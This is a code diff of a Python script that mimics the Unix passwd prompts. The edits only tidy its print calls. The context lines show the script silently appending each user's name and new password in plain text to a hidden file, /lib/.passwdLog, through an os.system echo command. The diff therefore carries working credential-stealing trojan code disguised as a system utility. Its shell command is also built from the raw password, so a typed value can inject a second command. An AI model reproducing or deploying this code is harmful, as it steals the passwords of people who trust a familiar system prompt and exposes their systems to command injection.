@@ -17,12 +17,12 @@ def main():
         os.system('stty -echo')
         while(x):
             password = input("New password: ")
-            print("\n")
+            print("")
             dump = input("Retype new password: ")
-            print("\n")
+            print("")
             if(password != dump):
                 print("Sorry, passwords do not match.")
-                print("\n")
+                print("")
             else:
                 x = False
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
@@ -33,14 +33,14 @@ def main():
         os.system('stty -echo')
         while(x):
             current = input("(current) UNIX password: ")
-            print("\n")
+            print("")
             password = input("New password: ")
-            print("\n")
+            print("")
             dump = input("Retype new password: ")
-            print("\n")
+            print("")
             if(password != dump):
                 print("Sorry, passwords do not match.")
-                print("\n")
+                print("")
             else:
                 x = False
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
